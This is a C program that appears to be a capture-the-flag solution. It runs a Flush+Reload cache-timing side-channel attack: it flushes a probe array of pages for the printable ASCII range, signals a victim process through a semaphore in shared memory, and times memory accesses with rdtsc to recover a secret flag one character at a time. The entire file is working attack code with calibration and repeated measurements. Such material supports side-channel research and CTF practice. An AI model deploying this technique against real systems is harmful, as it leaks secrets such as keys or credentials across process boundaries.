#include <stdio.h>
#include <stdint.h>
#include <semaphore.h>
#include <unistd.h>
#include <x86intrin.h>

#define SHARED_MEMORY_BASE 0x1337000

static inline uint64_t rdtsc() {
    uint32_t lo, hi;
    __asm__ volatile("rdtsc" : "=a"(lo), "=d"(hi));
    return ((uint64_t)hi << 32) | lo;
}

static inline void clflush(void *addr) {
    __asm__ volatile("clflush (%0)" :: "r"(addr) : "memory");
}

uint64_t time_access(void *addr) {
    uint64_t start, end;
    _mm_mfence();
    start = rdtsc();
    volatile char x = *(volatile char*)addr;
    _mm_mfence();
    end = rdtsc();
    return end - start;
}

int main() {
    sem_t *sem = (sem_t*)SHARED_MEMORY_BASE;
    int *index_ptr = (int*)(SHARED_MEMORY_BASE + sizeof(sem_t));
    
    char flag[100] = {0};
    
    // First, let's calibrate by seeing what happens with a known access
    printf("=== Calibration ===\n");
    *index_ptr = 0;  // First character
    
    // Flush all pages we care about (printable ASCII range)
    for (int c = 0x20; c <= 0x7e; c++) {
        clflush((void*)(0x1338000 + c * 0x1000));
    }
    _mm_mfence();
    
    // Trigger victim
    sem_post(sem);
    usleep(1000);  // Give victim time to execute
    
    // Check timing for all printable characters
    printf("Timing results after triggering victim with index=0:\n");
    for (int c = 0x20; c <= 0x7e; c++) {
        uint64_t timing = time_access((void*)(0x1338000 + c * 0x1000));
        if (timing < 300) {  // Adjust threshold based on results
            printf("FAST: '%c' (0x%02x): %lu cycles\n", c, c, timing);
        }
    }
    
    printf("\n=== Starting attack ===\n");
    
    for (int pos = 0; pos < 80; pos++) {
        printf("Position %d: ", pos);
        *index_ptr = pos;
        
        uint64_t best_timing = UINT64_MAX;
        char best_char = 0;
        int fast_count = 0;
        
        // Multiple measurements for reliability
        for (int attempt = 0; attempt < 10; attempt++) {
            // Flush all printable ASCII pages
            for (int c = 0x20; c <= 0x7e; c++) {
                clflush((void*)(0x1338000 + c * 0x1000));
            }
            _mm_mfence();
            
            // Trigger victim
            sem_post(sem);
            usleep(100);
            
            // Find the fastest access (most likely cache hit)
            for (int c = 0x20; c <= 0x7e; c++) {
                uint64_t timing = time_access((void*)(0x1338000 + c * 0x1000));
                if (timing < best_timing) {
                    best_timing = timing;
                    best_char = c;
                }
                if (timing < 200) {  // Count fast accesses
                    fast_count++;
                }
            }
        }
        
        flag[pos] = best_char;
        printf("'%c' (timing: %lu, fast_count: %d)\n", best_char, best_timing, fast_count);
        
        // If we're getting too many fast accesses, something's wrong
        if (fast_count > 50) {
            printf("Too many fast accesses, stopping\n");
            break;
        }
        
        // Stop at null byte or if timing suggests no clear winner
        if (best_char == 0 || best_timing > 500) {
            break;
        }
    }
    
    printf("\nFlag: %s\n", flag);
    return 0;
}
